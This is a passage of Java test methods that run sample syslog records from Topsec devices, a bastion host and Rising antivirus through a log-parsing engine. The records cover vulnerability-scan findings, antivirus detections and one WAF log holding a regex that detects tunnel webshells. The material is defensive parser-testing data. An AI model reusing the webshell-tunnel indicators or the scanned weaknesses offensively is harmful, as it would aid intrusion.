      botuEngine.addBotuListener(listener);
      // 用户登录/登出
      String data = "res_type=redhat_unix protocol=ssh2 user_id=123 uip=192.168.20.83 uname=123 asset=testqq aip=192.168.3.20 account=root atime=1517300564103 etime=1517369231278 session_id=00gl13sq5d sessionpath=/18/01/31/00gl13sq5d fort_ip=192.168.24.3 remark=";
      parse(botuEngine, data);
      data = "commands=ls sessionpath=/18/01/31/00gl13sq5d res_type=redhat_unix protocol=ssh2 user_id=123 uip=192.168.3.20 uname=123 atime='2018-01-30 16:19:59' asset=testqq aip=192.168.22.37 account=root session_id=00gl13sq5d fort_ip=192.168.24.3 remark=";
      parse(botuEngine, data);
      data = "issuc=1 commands=ls atime='2017-08-08 23:44:54' sessionpath=/17/08/08/00raoklobh seq=00l7xlaul9 account=root aip=192.168.21.102 asset=111 fort_ip=192.168.24.3 protocol=ssh2 remark= res_type=redflag_unix session_id=00ma5gb3hd uip=192.168.20.8 uname=123 user_id=123";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  //天融信工控漏扫
  public void testVulnScannerTopsec2() {
    String parserFile = "./resources/parsers/vulnscanner_topsec_topscanner[3.2294.1031_ICS.1]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "id=\"NGTOS\" version=\"v3.2294.1033_ICS.1\" time=\"2021-04-30 05:33:26\" dev=\"TopsecOS\" pri=\"信息\" type=\"管理员配置日志\" recorder=\"config\" index=\"2000\" vsid=\"0\" user=\"superman\" src=\"10.63.36.9\" result=\"成功\" msg=\"log config set ipaddr  10.7.202.10 10.7.202.8 port udp:514 logtype welf trans enable trans_gather no trans_coding gb2312 \"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1033_ICS.1\" time=\"2021-04-30 05:33:26\" dev=\"TopsecOS\" pri=\"信息\" type=\"管理员配置日志\" recorder=\"config\" index=\"2000\" vsid=\"0\" user=\"superman\" src=\"10.63.36.9\" result=\"成功\" msg=\"log config set console off local-database off \"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1033_ICS.1\" time=\"2021-04-30 05:33:26\" dev=\"TopsecOS\" pri=\"信息\" type=\"管理员配置日志\" recorder=\"config\" index=\"2000\" vsid=\"0\" user=\"superman\" src=\"10.63.36.9\" result=\"成功\" msg=\"log config crypt disable \"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1033_ICS.1\" time=\"2021-04-30 05:32:32\" dev=\"TopsecOS\" pri=\"信息\" type=\"管理员登录日志\" recorder=\"admin\" index=\"2010\" vsid=\"0\" user=\"superman\" src=\"10.63.36.9\" op=\"本地认证\" method=\"Web浏览器\" result=\"-3007\" description=\"Incorrect password.\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1033_ICS.1\" time=\"2021-04-30 05:32:48\" dev=\"TopsecOS\" pri=\"信息\" type=\"管理员登录日志\" recorder=\"admin\" index=\"2010\" vsid=\"0\" user=\"superman\" src=\"10.63.36.9\" op=\"本地认证\" method=\"Web浏览器\" result=\"0\" description=\"login success\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1073_TVS.1_more\" time=\"2021-04-08 05:53:10\" dev=\"TopsecOS\" pri=\"告警\" type=\"固件升级\" recorder=\"firmware\" index=\"2090\" vsid=\"0\" op=\"update\" result=\"0\" msg=\"update success.\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1033_ICS.1\" time=\"2021-05-06 05:54:58\" dev=\"TopsecOS\" pri=\"通知\" type=\"license升级\" recorder=\"license\" index=\"2095\" vsid=\"0\" op=\"update\" msg=\"license update failed.\"iled.\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1033_ICS.1\" time=\"2021-04-30 05:32:16\" dev=\"TopsecOS\" pri=\"告警\" type=\"CPU占用率日志\" recorder=\"cpu_monitor\" index=\"2400\" vsid=\"0\" msg=\"The occupancy rate of CPU has reached 4%!\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1033_ICS.1\" time=\"2021-04-30 05:32:10\" dev=\"TopsecOS\" pri=\"告警\" type=\"内存占用率日志\" recorder=\"memory_monitor\" index=\"2401\" vsid=\"0\" msg=\"The occupancy rate of MEMORY has reached 22%!\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1033_ICS.1\" time=\"2021-04-30 05:32:10\" dev=\"TopsecOS\" pri=\"告警\" type=\"磁盘占用率日志\" recorder=\"disk_monitor\" index=\"2402\" vsid=\"0\" msg=\"The occupancy rate of DISK has reached 27%!\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1073_TVS.1_more\" time=\"2021-04-08 05:50:10\" dev=\"TopsecOS\" pri=\"信息\" type=\"漏洞信息日志\" recorder=\"topvas\" index=\"2493\" vsid=\"0\" srcIPv4=\"10.26.50.25\" srcIPv6=\"fe80::250:56ff:fea9:4ef3\" srcPort=\"0\" dstIPv4=\"10.26.33.234\" dstIPv6=\"null\" dstPort=\"5432\" dstDomainName=\"\" scanID=\"cp-cp-234\" scanType=\"系统扫描\" VulnName=\"PostgreSQL弱密码\" VulnType=\"3\" TVID=\"TVID-201800-51128\" VulnCost=\"9\" VulnRepair=\"尽快修改密码。\" VulnDesc=\"可以使用弱凭据以用户postgres身份登录到远程PostgreSQL。\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1073_TVS.1_more\" time=\"2021-04-08 05:50:10\" dev=\"TopsecOS\" pri=\"信息\" type=\"漏洞信息日志\" recorder=\"topvas\" index=\"2493\" vsid=\"0\" srcIPv4=\"10.26.50.25\" srcIPv6=\"fe80::250:56ff:fea9:4ef3\" srcPort=\"0\" dstIPv4=\"10.26.33.234\" dstIPv6=\"null\" dstPort=\"0\" dstDomainName=\"\" scanID=\"cp-cp-234\" scanType=\"系统扫描\" VulnName=\"操作系统探测\" VulnType=\"3\" TVID=\"TVID-201800-48752\" VulnCost=\"0\" VulnRepair=\"null\" VulnDesc=\"这个插件通过TopVAS操作系统指纹库，会列举出可能的操作系统\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1073_TVS.1_more\" time=\"2021-04-08 05:50:10\" dev=\"TopsecOS\" pri=\"信息\" type=\"漏洞信息日志\" recorder=\"topvas\" index=\"2493\" vsid=\"0\"srcIPv4=\"10.26.50.25\" srcIPv6=\"fe80::250:56ff:fea9:4ef3\" srcPort=\"0\" dstIPv4=\"10.26.33.234\" dstIPv6=\"null\" dstPort=\"22\" dstDomainName=\"\" scanID=\"cp-cp-234\" scanType=\"系统扫描\" VulnName=\"OpenSSH 信息泄露漏洞(CVE-2018-15919)\" VulnType=\"3\" TVID=\"TVID-201800-38546\" VulnCost=\"5\" VulnRepair=\"https://www.openssh.com/\" VulnDesc=\"OpenSSH（OpenBSD Secure Shell）是OpenBSD计划组的一套用于安全访问远程计算机的连接工具。该工具是SSH协议的开源实现，支持对所有的传输进行加密，可有效阻止窃听、连接劫持以及其他网络级的攻击。OpenSSH 7.8及之前版本中的auth-gss2.c文件存在信息泄露漏洞。该漏洞源于网络系统或产品在运行过程中存在配置等错误。未授权的攻击者可利用漏洞获取受影响组件敏感信息。\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1073_TVS.1_more\" time=\"2021-04-08 05:50:10\" dev=\"TopsecOS\" pri=\"信息\" type=\"漏洞信息日志\" recorder=\"topvas\" index=\"2493\" vsid=\"0\" srcIPv4=\"10.26.50.25\" srcIPv6=\"fe80::250:56ff:fea9:4ef3\" srcPort=\"0\" dstIPv4=\"10.26.33.234\" dstIPv6=\"null\" dstPort=\"22\" dstDomainName=\"\" scanID=\"cp-cp-234\" scanType=\"系统扫描\" VulnName=\"支持SSH弱加密算法\" VulnType=\"3\" TVID=\"TVID-201600-45057\" VulnCost=\"4.3\" VulnRepair=\"禁用弱加密算法。\" VulnDesc=\"远程SSH服务器配置为允许弱加密算法。\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1033_ICS.1\" time=\"2021-04-30 05:32:59\" dev=\"TopsecOS\" pri=\"通知\" type=\"任务管理日志\" recorder=\"topvas\" index=\"2499\" vsid=\"0\" UserName=\"superman\" scanType=\"工控任务\" scanName=\"test5\" distributed=\"本地模式\" moudle=\"\" operation=\"重新扫描\" message=\"操作成功\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1033_ICS.1\" time=\"2021-04-30 05:33:08\" dev=\"TopsecOS\" pri=\"通知\" type=\"任务管理日志\" recorder=\"topvas\" index=\"2499\" vsid=\"0\" UserName=\"superman\" scanType=\"系统扫描\" scanName=\"test1\" distributed=\"本地模式\" moudle=\"全部漏洞\" operation=\"重新扫描\" message=\"操作成功\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1033_ICS.1\" time=\"2021-05-06 03:27:21\" dev=\"TopsecOS\" pri=\"通知\" type=\"基线配置核查日志\" recorder=\"topvas\" index=\"2503\" vsid=\"0\" ip_address=\"2.1.1.132\" scan_name=\"lalalalalala\" check_item=\"检查是否限制可以访问F5的SNMP agent网管工作站\" check_id=\"Device-NetDevice-LoadBalancing-F5-F5-BIG-IP-BasicInfo-Auto-1\" check_result=\"异常\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1033_ICS.1\" time=\"2021-05-06 03:27:21\" dev=\"TopsecOS\" pri=\"通知\" type=\"基线配置核查日志\" recorder=\"topvas\" index=\"2503\" vsid=\"0\" ip_address=\"2.1.1.132\" scan_name=\"lalalalalala\" check_item=\"查看SSH用户登录超时时间配置\" check_id=\"Device-NetDevice-LoadBalancing-F5-F5-BIG-IP-SecurityStrategy-Auto-1\" check_result=\"异常\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1033_ICS.1\" time=\"2021-05-06 03:27:21\" dev=\"TopsecOS\" pri=\"通知\" type=\"基线配置核查日志\" recorder=\"topvas\" index=\"2503\" vsid=\"0\" ip_address=\"2.1.1.132\" scan_name=\"lalalalalala\" check_item=\"限制HTTPS登录的IP地址\" check_id=\"Device-NetDevice-LoadBalancing-F5-F5-BIG-IP-AccessControl-SemiAuto-2\" check_result=\"异常\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1033_ICS.1\" time=\"2021-05-06 03:27:21\" dev=\"TopsecOS\" pri=\"通知\" type=\"基线配置核查日志\" recorder=\"topvas\" index=\"2503\" vsid=\"0\" ip_address=\"2.1.1.132\" scan_name=\"lalalalalala\" check_item=\"查看WebUI最大访问连接数\" check_id=\"Device-NetDevice-LoadBalancing-F5-F5-BIG-IP-AccessControl-Auto-3\" check_result=\"异常\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-25 02:31:49\" dev=\"TopAPP\" pri=\"warning\" type=\"pf\" recorder=\"pf\" vsid=\"0\" src=\"3.3.3.2\" dst=\"3.3.3.1\" sport=\"7660\" dport=\"8\" smac=\"00:0c:29:bc:df:1b\" dmac=\"00:50:56:3c:4a:e3\" protoid=\"1\" sdev=\"feth2\" op=\"permit\" ";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  //天融信
  public void testADTopsec() {
    String parserFile = "./resources/parsers/ad_topsec_topad[3.2294.30096]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      // ac
      String data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-24 06:15:28\" dev=\"TopAPP\" pri=\"information\" type=\"ad_ac\" recorder=\"ac\" vsid=\"0\" objname=\"231\" protocol=\"1\" indev=\"feth2\" src=\"3.3.3.2\" srcport=\"30247\" dst=\"2.2.2.3\" dstport=\"8\" action=\"matched\" result=\"deny\" result_code=\"550110\"";
      parse(botuEngine, data);
      // ad_ctrlsess
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-24 05:51:27\" dev=\"TopAPP\" pri=\"information\" type=\"ad_ctrlsess\" recorder=\"control-session\" vsid=\"0\" policyid=\"20547\" condition_type=\"dst addr obj\" user=\" \" cs_obj=\"2.2.2.3\" action=\"connection number already reached threshold\" result=\"warning\"";
      parse(botuEngine, data);
      // ad_waf
      data = "id=\"ngtos\" version=\"V3.2242.30073_TAD.1_R\" time=\"2019-07-29 13:45:32\" dev=\"TopAPP\" pri=\"information\" type=\"ad_waf\" recorder=\"ad_waf\" vsid=\"0\" src=\"3.1.1.3\" srcport=\"22422\" dst=\"2.2.2.12\" dstport=\"443\" req_method=\"get\" host=\"https\" req_url=\"www.baidu.com\" status=\"2\" rule_id=\"2\" action=\"deny\" rule_message=\"2\" match_detail=\"2\" req_header=\"Operator `Rx\\' with parameter `(tunnel\\.(nosocket|tomcat.5)|tunnel)\\.(ashx|aspx|jsp|php)\\' against variable `REQUEST_LINE\\' (Value: `GET /tunnel.jsp HTTP/1.1\\' )GET /tunnel.jsp HTTP/1.1 User-Agent: curl/7.20.0 (x86_64-target-linux-gnu) libcurl/7.20.0 NSS/3.12.4.5 zlib/1.2.5 libidn/0.6.5 Host: 3.1.1.12:2333 Accept: */* \"";
      parse(botuEngine, data);
      // admin_login
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-23 12:05:45\" dev=\"TopAPP\" pri=\"information\" type=\"admin\" recorder=\"admin_login\" vsid=\"0\" user=\"superman\" src=\"192.168.90.39\" op=\"local login\" method=\"WEBUI\" result=\"1000\" description=\"login success\"";
      parse(botuEngine, data);
      // admin_pwd
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-24 03:41:13\" dev=\"TopAPP\" pri=\"information\" type=\"admin\" recorder=\"admin_pwd\" vsid=\"0\" user=\"liuliu\" result=\"0\" description=\"modify self passwd success.\"";
      parse(botuEngine, data);
      // cpu_monitor
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-24 06:58:40\" dev=\"TopAPP\" pri=\"emergent\" type=\"cpu_monitor\" recorder=\"cpu_monitor\" vsid=\"0\" msg=\"cpu occupancy rate too high\"";
      parse(botuEngine, data);
      // memory_monitor
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-24 07:01:27\" dev=\"TopAPP\" pri=\"emergent\" type=\"memory_monitor\" recorder=\"memory_monitor\" vsid=\"0\" msg=\"memory occupancy rate too high\"";
      parse(botuEngine, data);
      // disk_monitor
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-24 07:00:12\" dev=\"TopAPP\" pri=\"emergent\" type=\"disk_monitor\" recorder=\"disk_monitor\" vsid=\"0\" msg=\"disk occupancy rate too high\"";
      parse(botuEngine, data);
      // db_sec
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-24 07:15:18\" dev=\"TopAPP\" pri=\"error\" type=\"db_sec\" recorder=\"db_sec\" vsid=\"0\" src=\"3.3.3.3\" srcport=\"57160\" dst=\"2.2.2.3\" dstport=\"80\" dbtype=\"none\" msg=\"protocol do not distinguish\"";
      parse(botuEngine, data);
      // db_sec_match
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-24 02:44:38\" dev=\"TopAPP\" pri=\"warning\" type=\"db_sec_match\" recorder=\"db_sec_match\" vsid=\"0\" src=\"3.3.3.3\" srcport=\"55587\" dst=\"2.2.2.3\" dstport=\"80\" dbtype=\"MySQL\" zone=\"afwf\" action=\"permit\"";
      parse(botuEngine, data);
      // ddos_atk
      data = "id=\"ngtos\" version=\"V3.2242.30073_TAD.1_R\" time=\"2019-07-29 13:56:28\" dev=\"TopAPP\" pri=\"information\" type=\"ddos_atk\" recorder=\"ddos_atk\" vsid=\"0\" dst_addr=\"3.3.3.2\" zonename=\"topsec\" attack_status=\"begin\" src_addr=\"2.2.2.2\" service=\"0\" attack_type=\"ip\" total_packets=\"4197390\" total_bytes=\"4197384\" data_action=\"detect\"";
      parse(botuEngine, data);
      // bind
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-25 06:36:16\" dev=\"TopAPP\" pri=\"information\" type=\"dns\" recorder=\"bind\" vsid=\"0\" msg=\"received control channel command 'stats'\"";
      parse(botuEngine, data);
      // dns_proxy
      //data = "id=\"ngtos\" version=\"V3.2242.30069_TAD_20190716_0502.1\" time=\"2019-07-18 12:34:04\" dev=\"TopAPP\" pri=\"debug\" type=\"dns_proxy\" recorder=\"dns_Proxy\" vsid=\"0\" dns_proxy_type=\"DNS Proxy\" src=\"3.3.3.2\" srcport=\"53\" dst=\"4197061\" dstport=\"80\" protocol=\"6\" action=\"nat\" objname=\"dns query\" result=\"failed\" result_code=\"0\"";
      //parse(botuEngine, data);
      // eos
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-23 12:20:07\" dev=\"TopAPP\" pri=\"information\" type=\"eos\" recorder=\"eos\" vsid=\"0\" objtype=\"link\" objname=\"local_link\" eos_chkname=\"icmp-ok\" method=\"ICMP\" action=\"healthcheck\" result=\"none\" result_code=\"507019\"";
      parse(botuEngine, data);
      // firmware
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-24 02:59:27\" dev=\"TopAPP\" pri=\"notice\" type=\"firmware_update\" recorder=\"firmware\" vsid=\"0\" op=\"delete\" result=\"-102653\" msg=\"firmware delete failed\"";
      parse(botuEngine, data);
      // license
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-24 02:58:01\" dev=\"TopAPP\" pri=\"notice\" type=\"license_update\" recorder=\"license\" vsid=\"0\" op=\"update\" msg=\"license update success.\"";
      parse(botuEngine, data);
      // fproxy
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-24 02:34:24\" dev=\"TopAPP\" pri=\"debug\" type=\"fproxy\" recorder=\"fproxy\" vsid=\"0\" src=\"3.3.3.3\" srcport=\"55481\" dst=\"3.3.3.1\" dstport=\"80\" protocol=\"tcp\" action=\"fproxy entry success\" result=\"success\" result_code=\"533009\"";
      parse(botuEngine, data);
      // fproxy_http
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-24 02:35:12\" dev=\"TopAPP\" pri=\"debug\" type=\"fproxy_http\" recorder=\"fproxy_http\" vsid=\"0\" src=\"3.3.3.3\" srcport=\"55496\" dst=\"3.3.3.1\" dstport=\"80\" action=\"http parse init success\" result=\"success\" result_code=\"533019\"";
      parse(botuEngine, data);
      // gslb_wideip_module
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-24 07:59:14\" dev=\"TopAPP\" pri=\"debug\" type=\"gslb_wideip\" recorder=\"gslb_wideip_module\" vsid=\"0\" query_domain=\"新浪微博\" zone=\"topsec\" action=\"query record after\" resource=\"172.18.2.55\" result=\"failed\" result_code=\"-525006\"";
      parse(botuEngine, data);
      // ha
      data = "id=\"ngtos\" version=\"V3.2242.30022_TAD.1\" time=\"2018-11-13 10:25:57\" dev=\"TopAPP\" pri=\"information\" type=\"ha\" recorder=\"ha\" vsid=\"0\" msg=\"ha start OK\"";
      parse(botuEngine, data);
      // wideip_module
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-25 06:30:57\" dev=\"TopAPP\" pri=\"debug\" type=\"inbound\" recorder=\"wideip_module\" vsid=\"0\" query_domain=\"新浪微博\" zone=\"topsec\" action=\"query record after\" resource=\"172.18.2.55\" result=\"failed\" result_code=\"-525006\" ";
      parse(botuEngine, data);
      // info_sync
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-24 07:45:27\" dev=\"TopAPP\" pri=\"information\" type=\"info_sync\" recorder=\"info_sync\" vsid=\"0\" src_node=\"192.168.90.1\" dst_node=\"192.168.90.36\" action=\"recv config sync msg\" result=\"none\" result_code=\"526059\" ";
      parse(botuEngine, data);
      // interface
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-25 06:56:17\" dev=\"TopAPP\" pri=\"alarm\" type=\"interface\" recorder=\"interface\" vsid=\"0\" interface=\"feth1\" op=\"down\" speed=\"-\" duplex=\"-\" ";
      parse(botuEngine, data);
      // lfm
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-23 12:01:25\" dev=\"TopAPP\" pri=\"information\" type=\"lfm\" recorder=\"lfm\" vsid=\"0\" src=\"3.3.3.3\" srcport=\"51018\" dst=\"3.3.3.1\" dstport=\"80\" protocol=\"tcp\" action=\"process new session\" result=\"success\" result_code=\"532000\" vsname=\"TopAD_FL4_VS\" mbip=\"2.2.2.3\" mbport=\"8081\" snatip=\" \" ";
      parse(botuEngine, data);
      // config
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-25 06:08:55\" dev=\"TopAPP\" pri=\"information\" type=\"mgmt\" recorder=\"config\" vsid=\"0\" user=\"superman\" src=\"192.168.90.39\" result=\"0\" msg=\"system admin delete name liuliu \"";
      parse(botuEngine, data);
      // neighbour
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-25 06:52:40\" dev=\"TopAPP\" pri=\"notice\" type=\"neighbour\" recorder=\"neighbour\" vsid=\"0\" interface=\"TopAD\" ip=\"2000:::\" msg=\"Duplicate address detected!\"";
      parse(botuEngine, data);
      // outbound
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-23 12:21:26\" dev=\"TopAPP\" pri=\"debug\" type=\"outbound\" recorder=\"outbound\" vsid=\"0\" outboundtype=\"Link Outbound\" src=\"3.3.3.2\" srcport=\"21510\" dst=\"2.2.2.3\" dstport=\"8\" protocol=\"1\" action=\"match\" objname=\"ob\" result=\"success\" result_code=\"522004\"";
      parse(botuEngine, data);
      // pf
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-25 02:31:49\" dev=\"TopAPP\" pri=\"warning\" type=\"pf\" recorder=\"pf\" vsid=\"0\" src=\"3.3.3.2\" dst=\"3.3.3.1\" sport=\"7660\" dport=\"8\" smac=\"00:0c:29:bc:df:1b\" dmac=\"00:50:56:3c:4a:e3\" protoid=\"1\" sdev=\"feth2\" op=\"permit\" ";
      parse(botuEngine, data);
      // poap_agent
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-23 12:17:36\" dev=\"TopAPP\" pri=\"debug\" type=\"poap_agent\" recorder=\"poap_agent\" vsid=\"0\" objname=\"NULL\" objtype=\"snat\" action=\"show\" result=\"success\" result_code=\"515110\" ";
      parse(botuEngine, data);
      // poap_runtime
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-31 11:53:51\" dev=\"TopAPP\" pri=\"debug\" type=\"poap_runtime\" recorder=\"poap_runtime\" vsid=\"0\" age=\"3\" section=\"ngtos config pre do\" action=\"topad ngtos config switch preamble do begin\" objtype=\"0\" objname=\" \" result=\"success\" result_code=\"517001\" ";
      parse(botuEngine, data);
      // proxy
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-23 11:59:15\" dev=\"TopAPP\" pri=\"debug\" type=\"proxy\" recorder=\"proxy\" vsid=\"0\" msg=\"2018/10/23 19:59:15 [debug] 85911#0: timer delta: 900\" ";
      parse(botuEngine, data);
      // session
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-24 02:56:14\" dev=\"TopAPP\" pri=\"information\" type=\"session\" recorder=\"session\" vsid=\"0\" src=\"3.3.3.2\" dst=\"2.2.2.3\" trans_sip=\"3.3.3.1\" trans_dip=\"2.2.2.1\" proto=\"tcp\" sport=\"80\" dport=\"80\" trans_sport=\"80\" trans_dport=\"80\" rcv_pkt=\"1022\" send_pkt=\"333\" rcv_bytes=\"105869\" send_bytes=\"65748\" duration=\"20\" op=\"create\" appname=\"null\" ";
      parse(botuEngine, data);
      // statistics
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-23 12:18:58\" dev=\"TopAPP\" pri=\"debug\" type=\"statistics\" recorder=\"statistics\" vsid=\"0\" objname=\"link dp\" action=\"store data from data_buffer to database\" result=\"none\" result_code=\"520003\" ";
      parse(botuEngine, data);
      // topguard
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-25 06:53:57\" dev=\"TopAPP\" pri=\"information\" type=\"topguard\" recorder=\"topguard\" vsid=\"0\" op=\"topguard\" msg=\"new update package,check server\"";
      parse(botuEngine, data);
      // vcm
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-25 06:13:23\" dev=\"TopAPP\" pri=\"notice\" type=\"vcm\" recorder=\"vcm\" vsid=\"0\" msg=\"virtual for vcm_test is start try connected of vmware.\" ";
      parse(botuEngine, data);
      // vpn
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-24 02:06:31\" dev=\"TopAPP\" pri=\"information\" type=\"vpn_packet\" recorder=\"vpn\" vsid=\"0\" msg=\"SID-SECURENAT-2,-,5E41DC58388E,FFFFFFFFFFFF,0x0800,342,DHCPv4,Response,192.168.30.1,bootps(67),255.255.255.255,bootpc(68),-,-,TransactionId=2976382165 ClientIP=0.0.0.0 YourIP=192.177.7.77 ServerIP=192.168.30.1 RelayIP=0.0.0.0,-,-,-\" ";
      parse(botuEngine, data);
      // vpn_security
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-31 11:58:12\" dev=\"TopAPP\" pri=\"information\" type=\"vpn_security\" recorder=\"vpn\" vsid=\"0\" msg=\"Session \\\"SID-ROOT-4\\\": The parameter has been set. Max number of TCP connections: 2, Use of encryption: Yes, Use of compression: No, Use of Half duplex communication: No, Timeout: 20 seconds.\" ";
      parse(botuEngine, data);
      // vpn_server
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-31 11:59:11\" dev=\"TopAPP\" pri=\"information\" type=\"vpn_server\" recorder=\"vpn\" vsid=\"0\" msg=\"For the client (IP address: 3.3.3.3, host name: \\\"79T54DYBLEVPBJU\\\", port number: 50300), connection \\\"CID-14\\\" has been created.\" ";
      parse(botuEngine, data);
      // wave
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-24 02:36:56\" dev=\"TopAPP\" pri=\"information\" type=\"wave\" recorder=\"wave\" vsid=\"0\" src=\"3.3.3.3\" srcport=\"55513\" dst=\"2.2.2.3\" dstport=\"8081\" objname=\"2223_node\" queue_len=\"1\" action=\"store request to queue\" result=\"success\" result_code=\"534001\" ";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  //瑞星杀毒
  public void testAvRising() {
    String parserFile = "./resources/parsers/antivirus_rising_esm_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<0> 2020-07-23 13:24:09 rx01 AV 0 PUF.GameHack!1.B5BD 病毒 删除成功 自定义查杀 SAMP(8).VIR C:\\Users\\xcb\\Desktop\\样本11\\样本 2020-04-10 11:13:36 WIN-7PFQL9NTGNS 192.168.1.3 00-0C-29-68-0B-D7";
      parse(botuEngine, data);
      data = "<0> 2020-07-23 13:24:09 rx01 AV 0 Trojan.Kryptik!1.AA23 木马 删除成功 自定义查杀 SAMP(3).VIR C:\\Users\\xcb\\Desktop\\样本11\\样本 2020-04-10 11:13:35 WIN-7PFQL9NTGNS 192.168.1.3 00-0C-29-68-0B-D7";
      parse(botuEngine, data);
      data = "<0> 2020-07-23 13:24:09 rx01 AV 0 Malware.Undefined!8.C 病毒 删除成功 自定义查杀 Samp(5).vbs C:\\Users\\xcb\\Desktop\\样本2ttttt\\样本2 2020-04-13 12:28:15 WIN-7PFQL9NTGNS 192.168.1.3 00-0C-29-68-0B-D7";
      parse(botuEngine, data);
      data = "<0> 2020-07-23 13:24:09 rx01 AV 0 Downloader.Agent!8.B23 病毒 删除成功 自定义查杀 Samp(1).vbs C:\\Users\\xcb\\Desktop\\样本2ttttt\\样本2 2020-04-13 12:28:14 WIN-7PFQL9NTGNS 192.168.1.3 00-0C-29-68-0B-D7";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  //天融信工控入侵检测与审计系统
